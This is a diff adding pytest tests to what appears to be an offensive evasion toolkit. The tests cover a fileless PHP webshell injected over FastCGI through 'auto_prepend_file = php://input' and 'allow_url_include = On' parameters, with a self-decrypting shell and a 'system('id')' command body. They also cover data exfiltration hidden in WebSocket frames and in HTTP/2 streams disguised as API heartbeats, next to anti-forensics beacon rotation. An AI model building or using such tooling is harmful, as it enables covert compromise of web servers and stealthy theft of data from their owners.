@@ -623,6 +623,94 @@ if __name__ == '__main__':
     pytest.main([__file__, '-v'])
 
 
+class TestFilelessWebShell:
+    """Test FastCGI in-memory (fileless) webshell"""
+
+    def test_import(self):
+        from evasion.fileless_webshell import FastCGIInjection, build_fastcgi_request
+        assert FastCGIInjection is not None
+
+    def test_build_request_has_fcgi_structure(self):
+        from evasion.fileless_webshell import build_fastcgi_request, FCGI
+
+        body = b"<?php phpinfo(); ?>"
+        req = build_fastcgi_request("/var/www/html/index.php", body)
+        # Magic version byte + begin-request type present.
+        assert req[0] == FCGI.VERSION_1
+        assert FCGI.BEGIN_REQUEST in req
+        assert FCGI.PARAMS in req
+        assert FCGI.STDIN in req
+
+    def test_params_enable_in_memory_exec(self):
+        from evasion.fileless_webshell import php_in_memory_params
+
+        params = php_in_memory_params("/var/www/html/index.php")
+        assert "auto_prepend_file = php://input" in params["PHP_VALUE"]
+        assert "allow_url_include = On" in params["PHP_VALUE"]
+
+    def test_ghost_shell_self_decrypting(self):
+        from evasion.fileless_webshell import FastCGIInjection
+
+        inj = FastCGIInjection()
+        shell = inj.generate_ghost_shell(os.urandom(32))
+        assert "php://input" in shell
+        assert "sodium_crypto_aead_aes256gcm_decrypt" in shell
+
+    def test_wire_roundtrip(self):
+        from evasion.fileless_webshell import FastCGIInjection
+
+        inj = FastCGIInjection()
+        key = os.urandom(32)
+        body = inj.build_request_body("system('id');", key)
+        assert isinstance(body, bytes)
+
+
+class TestInRequestExfil:
+    """Test protocol-level (in-request) data exfiltration"""
+
+    def test_import(self):
+        from evasion.in_request_exfil import ProtocolExfil, WebSocketTunnelExfil
+        assert ProtocolExfil is not None
+
+    def test_websocket_roundtrip(self):
+        from evasion.in_request_exfil import WebSocketTunnelExfil
+
+        exf = WebSocketTunnelExfil(chunk_size=64)
+        data = os.urandom(500)
+        frames = exf.exfiltrate(data)
+        # Binary frames carry the payload; recover must be lossless.
+        assert exf.recover(frames) == data
+
+    def test_websocket_wire_frames(self):
+        from evasion.in_request_exfil import WebSocketTunnelExfil
+
+        exf = WebSocketTunnelExfil(chunk_size=32)
+        frames = exf.exfiltrate(b"secret-loot-bytes")
+        raw = exf.encode_wire(frames)
+        decoded = exf.decode_wire(raw)
+        # Heartbeat (ping) frames are ignored on recover.
+        assert exf.recover(decoded) == b"secret-loot-bytes"
+
+    def test_http2_stream_smuggle(self):
+        from evasion.in_request_exfil import HTTP2StreamSmuggler
+
+        sm = HTTP2StreamSmuggler(chunk_size=32, streams=3)
+        data = os.urandom(200)
+        frames = sm.plan(data)
+        assert len(frames) > 0
+        # Each frame looks like a benign API heartbeat (x-trace trailer).
+        assert all("x-trace" in f.meta for f in frames)
+        assert sm.recover(frames) == data
+
+    def test_protocol_exfil_selector(self):
+        from evasion.in_request_exfil import ProtocolExfil, ExfilChannel
+
+        for ch in (ExfilChannel.WEBSOCKET, ExfilChannel.HTTP2):
+            exf = ProtocolExfil(channel=ch)
+            data = b"exfil-me-over-" + os.urandom(120)
+            assert exf.roundtrip(data) == data
+
+
 class TestAntiForensicsRotation:
     """Test anti-forensics key / beacon-ID rotation"""
 
